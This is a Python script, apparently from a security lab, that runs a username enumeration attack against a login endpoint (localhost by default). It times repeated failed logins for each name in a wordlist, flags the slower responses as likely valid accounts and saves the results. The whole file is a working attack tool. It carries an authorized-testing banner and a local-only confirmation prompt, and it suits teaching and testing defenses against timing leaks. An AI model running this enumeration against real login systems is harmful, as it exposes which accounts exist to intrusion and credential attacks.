"""
Username Enumeration Attack
Detects valid usernames via response timing or error message differences
"""
import requests
import time
import argparse
import json
from datetime import datetime
import statistics

TARGET_URL = "http://localhost:5000/login"

def print_banner():
    print("=" * 60)
    print("  USERNAME ENUMERATION ATTACK SIMULATOR")
    print("  WARNING: For authorized testing only!")
    print("=" * 60)
    print()

def measure_response_time(username, password, samples=3):
    """Measure average response time for a username"""
    times = []

    for _ in range(samples):
        start = time.time()
        try:
            response = requests.post(
                TARGET_URL,
                data={"username": username, "password": password},
                timeout=5
            )
            elapsed = time.time() - start
            times.append(elapsed)
        except requests.exceptions.RequestException:
            pass

    return statistics.mean(times) if times else 0

def run_attack(usernames_path, verbose=False):
    """
    Execute username enumeration attack

    Args:
        usernames_path: Path to usernames file
        verbose: Print each attempt
    """
    results = {
        "attack_type": "username_enumeration",
        "attempts": 0,
        "valid_usernames": [],
        "invalid_usernames": [],
        "start_time": time.time()
    }

    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Usernames: {usernames_path}")
    print(f"[*] Starting attack at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Method: Response timing analysis")
    print()

    try:
        with open(usernames_path, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Usernames file not found: {usernames_path}")
        return results

    # Use a known invalid password
    test_password = "ThisPasswordIsDefinitelyWrong123!@#"

    timing_data = []

    print("[*] Analyzing response times...")
    print()

    for username in usernames:
        results["attempts"] += 1

        avg_time = measure_response_time(username, test_password, samples=3)
        timing_data.append({
            "username": username,
            "avg_time": avg_time
        })

        if verbose:
            print(f"[TEST] {username:20s} | Avg time: {avg_time:.4f}s")

        time.sleep(0.1)  # Small delay to avoid overwhelming server

    # Analyze timing differences
    if timing_data:
        times = [d["avg_time"] for d in timing_data]
        mean_time = statistics.mean(times)
        stdev_time = statistics.stdev(times) if len(times) > 1 else 0

        print(f"\n[*] Mean response time: {mean_time:.4f}s")
        print(f"[*] Standard deviation: {stdev_time:.4f}s")
        print()

        # Usernames with significantly different timing might be valid
        threshold = mean_time + (stdev_time * 1.5)

        for data in timing_data:
            if data["avg_time"] > threshold:
                results["valid_usernames"].append(data["username"])
                print(f"[FOUND] Potential valid username: {data['username']} (time: {data['avg_time']:.4f}s)")
            else:
                results["invalid_usernames"].append(data["username"])

    results["end_time"] = time.time()
    results["duration_sec"] = results["end_time"] - results["start_time"]

    return results

def save_results(results):
    """Save attack results to file"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"results/username_enum_{timestamp}.json"

    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)

    print(f"\n[*] Results saved to: {filename}")

def print_summary(results):
    """Print attack summary"""
    print("\n" + "=" * 60)
    print("  ATTACK SUMMARY")
    print("=" * 60)
    print(f"Attack Type:       {results['attack_type']}")
    print(f"Total Tested:      {results['attempts']}")
    print(f"Valid Usernames:   {len(results['valid_usernames'])}")
    print(f"Invalid Usernames: {len(results['invalid_usernames'])}")
    print(f"Duration:          {results['duration_sec']:.2f} seconds")

    if results['valid_usernames']:
        print(f"\nPotential Valid Usernames:")
        for username in results['valid_usernames']:
            print(f"  - {username}")

    print("=" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Username Enumeration Attack Simulator")
    parser.add_argument("-u", "--usernames", required=True, help="Usernames file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--save", action="store_true", help="Save results to file")

    args = parser.parse_args()

    print_banner()

    # Confirm local testing
    confirm = input("Confirm this is LOCAL TESTING ONLY (yes/no): ")
    if confirm.lower() != 'yes':
        print("Attack cancelled.")
        exit(0)

    results = run_attack(args.usernames, args.verbose)
    print_summary(results)

    if args.save:
        save_results(results)
